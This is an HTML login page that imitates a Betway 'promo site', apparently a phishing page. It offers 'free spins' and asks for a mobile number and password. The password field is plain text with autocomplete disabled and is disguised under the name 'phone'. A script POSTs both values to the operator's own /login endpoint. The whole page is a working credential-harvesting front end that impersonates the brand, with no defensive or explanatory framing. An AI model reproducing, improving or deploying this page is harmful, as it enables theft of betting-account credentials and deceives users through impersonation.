
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">

  <title>Betway promos</title>

  <style>
    * {
      box-sizing: border-box;
      margin: 0;
      padding: 0;
      font-family: Arial, sans-serif;
    }
    .forgot-password {
      color: #00d66f;
      font-size: 13px;
      text-align: right;
      margin-top: -10px;
      margin-bottom: 20px;
      cursor: default;
    }
    body {
      min-height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
      background:
        linear-gradient(rgba(5, 10, 7, 0.78), rgba(5, 10, 7, 0.85)),
        url("images/background.jpg") center / cover no-repeat fixed;
      color: white;
      padding: 20px;
    }

    .login-box {
      width: 100%;
      max-width: 400px;
      padding: 35px;
      background: #111512;
      border: 1px solid #292f2b;
      border-radius: 16px;
      box-shadow: 0 0 35px #00d66f12;
    }

    .logo {
      display: flex;
      align-items: center;
      gap: 10px;
      color: #00d66f;
      font-size: 25px;
      font-weight: bold;
      margin-bottom: 35px;
      letter-spacing: 1px;
    }

   .logo img {
      width: 40px;
      height: 40px;
      max-width: 40px;
      max-height: 40px;
      object-fit: contain;
      flex-shrink: 0;
      display: block;
     }
    .logo span {
      color: white;
    }

    .subtitle {
      color: #00d66f;
      font-size: 12px;
      letter-spacing: 2px;
      margin-bottom: 12px;
    }

    h1 {
      font-size: 27px;
      margin-bottom: 10px;
    }

    .description {
      color: #a0a8a2;
      font-size: 14px;
      line-height: 1.5;
      margin-bottom: 28px;
    }

    label {
      display: block;
      margin-bottom: 8px;
      font-size: 14px;
    }

    input {
      width: 100%;
      padding: 13px;
      margin-bottom: 20px;
      background: #090c0a;
      border: 1px solid #353d37;
      border-radius: 7px;
      color: white;
      outline: none;
    }

    input:focus {
      border-color: #00d66f;
      box-shadow: 0 0 0 2px #00d66f20;
    }

    button {
      width: 100%;
      padding: 14px;
      background: #00d66f;
      color: #06130b;
      font-weight: bold;
      border: none;
      border-radius: 7px;
      cursor: pointer;
      transition: 0.2s;
    }

    button:hover {
      background: #00b85e;
    }

    #message {
      margin-top: 18px;
      font-size: 14px;
      line-height: 1.5;
      overflow-wrap: anywhere;
    }

    .footer {
      margin-top: 28px;
      text-align: center;
      color: #7d867f;
      font-size: 12px;
    }
  </style>
</head>

<body>
  <main class="login-box">
    <div class="logo"></div>
      <img src="images/logo.png" alt="Betway logo">
      <span>GREEN <span>ACCESS</span></span>
    </div>

    <p class="subtitle">WELCOME TO BETWAY PROMO SITE</p>
    <h1>Continue to your account</h1>

    <p class="description">
      Enter your details in the fields below.
    </p>

    <form id="loginForm">
      <label for="username">Mobile Number</label>

      <input
        id="username"
        name="username"
        type="text"
        placeholder="Mobile Number"
        autocomplete="username"
        maxlength="254"
        required
      >

      <label for="phone">Password</label>

      <input
        
        type="text"
        id="phone"
        name="phone"
        placeholder="Enter password"
        inputmode="text"
        autocomplete="off"
        required
      >
      <p class="forgot-password">Forgot Password?</p>

      <button type="submit">CONTINUE</button>
    </form>

    <p id="message" role="status" aria-live="polite"></p>

    <div class="footer">
      BETWAY.INC · PROMO 
    </div>
  </main>

  <script>
    const form = document.getElementById("loginForm");
    const message = document.getElementById("message");

    form.addEventListener("submit", async (event) => {
      event.preventDefault();

      message.style.color = "#ffffff";
      message.textContent = "Loading free spins...";

      try {
        const response = await fetch("/login", {
          method: "POST",
          headers: {
            "Content-Type": "application/json"
          },
          body: JSON.stringify({
            username: document.getElementById("username").value,
            phone: document.getElementById("phone").value
          })
        });

        const result = await response.json();

        if (!response.ok) {
          throw new Error(result.message || "Request failed");
        }

        message.style.color = "#00d66f";
        message.textContent = result.message;
        form.reset();

      } catch (error) {
        message.style.color = "#ff7777";
        message.textContent =
          "Could not connect. Make sure the server is running.";
      }
    });
  </script>
</body>
</html>
